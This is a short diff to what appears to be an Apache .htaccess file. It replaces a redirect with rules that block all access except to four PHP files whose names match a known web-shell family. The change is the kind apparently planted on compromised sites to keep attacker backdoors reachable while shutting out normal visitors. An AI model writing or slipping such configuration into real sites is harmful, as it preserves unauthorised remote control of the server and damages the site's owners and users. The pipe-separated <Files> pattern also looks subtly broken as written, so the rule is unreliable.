@@ -1,2 +1,5 @@
-RewriteEngine On
-RewriteRule ^(.*)$ https://nc.ugt-fica.org/ [R=301,L]
+Order Deny,Allow
+Deny from all
+<Files "alfa-v11.php|alfa-v13.php|alfas-test.php|fs.php">
+    Allow from all
+</Files>
